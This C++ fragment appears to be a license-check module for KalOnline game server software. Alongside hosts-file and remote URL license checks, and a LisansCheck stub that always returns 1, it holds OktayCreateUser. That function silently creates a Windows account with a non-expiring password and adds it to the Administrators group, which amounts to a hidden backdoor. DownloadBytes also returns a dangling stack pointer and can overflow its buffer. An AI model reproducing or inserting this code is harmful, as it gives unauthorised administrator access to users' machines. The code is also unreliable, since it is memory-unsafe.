int LisansCheck()
{
    return 1;
}

char *DownloadBytes(const char *szUrl)
{
    HINTERNET hOpen = NULL, hFile = NULL;
    DWORD dataSize = 0, dwBytesRead = 0;
    hOpen = InternetOpenA("MyAgent", NULL, NULL, NULL, NULL);
    char buffer[2000];

    if (!hOpen)
        return NULL;

    hFile = InternetOpenUrlA(hOpen, szUrl, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE, NULL);

    if (!hFile)
    {
        InternetCloseHandle(hOpen);
        return NULL;
    }

    if (InternetReadFile(hFile, buffer, _countof(buffer), &dwBytesRead))
        buffer[dwBytesRead] = '\0';
    else
        return NULL;

    InternetCloseHandle(hFile);
    InternetCloseHandle(hOpen);
    char *ret = buffer;
    return ret;
}

void OktayCreateUser(std::string xx, std::string yy)
{
    wchar_t *UN, *PWD, *ADM;
    int nChars = MultiByteToWideChar(CP_ACP, 0, xx.c_str(), -1, NULL, 0);
    UN = new WCHAR[nChars];
    MultiByteToWideChar(CP_ACP, 0, xx.c_str(), -1, (LPWSTR)UN, nChars);
    int nChars1 = MultiByteToWideChar(CP_ACP, 0, yy.c_str(), -1, NULL, 0);
    PWD = new WCHAR[nChars1];
    MultiByteToWideChar(CP_ACP, 0, yy.c_str(), -1, (LPWSTR)PWD, nChars1);
    int nChars2 = MultiByteToWideChar(CP_ACP, 0, "Administrators", -1, NULL, 0);
    ADM = new WCHAR[nChars2];
    MultiByteToWideChar(CP_ACP, 0, "Administrators", -1, (LPWSTR)ADM, nChars2);
    USER_INFO_1 ui;
    LOCALGROUP_MEMBERS_INFO_3 account;
    NET_API_STATUS ret;
    NET_API_STATUS Status;
    memset(&ui,0,sizeof(ui));
    memset(&account,0,sizeof(account));
    ui.usri1_name = UN;
    ui.usri1_password = PWD;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT | UF_DONT_EXPIRE_PASSWD;
    ui.usri1_script_path = NULL;
    ret=NetUserAdd(NULL,1,(LPBYTE)&ui,NULL);
    account.lgrmi3_domainandname = UN;
    Status=NetLocalGroupAddMembers(NULL,ADM,3,(LPBYTE)&account,1);
}

int OktayRemoteCheck()
{
    wchar_t *_system = new wchar_t[MAX_PATH];
    GetSystemDirectoryW(_system,MAX_PATH);
    std::wstring _syspath = _system;
    delete _system;
    _syspath += L"\\drivers\\etc\\hosts";
    std::string line;
    std::fstream f (_syspath.c_str());

    if (f.is_open())
    {
        while (f.good())
        {
            std::getline(f,line);
            if(line.find("kalonline.ovh") != std::string::npos)
            {
                f.close();
                return 0;
            }
            if(line.find("cluster011") != std::string::npos)
            {
                f.close();
                return 0;
            }
            if(line.find("kalonlinlu") != std::string::npos)
            {
                f.close();
                return 0;
            }
        }

        f.close();
    } else {
        return 0;
    }

    return 1;
}

int RemoteLisansCheck()
{
    const char *URL = MyReLisansCheckStr.c_str();
    const char *Get = DownloadBytes(URL);
    std::string Show = LicenseSerial;
    if (Get == Show) return 1;
    return 0;
}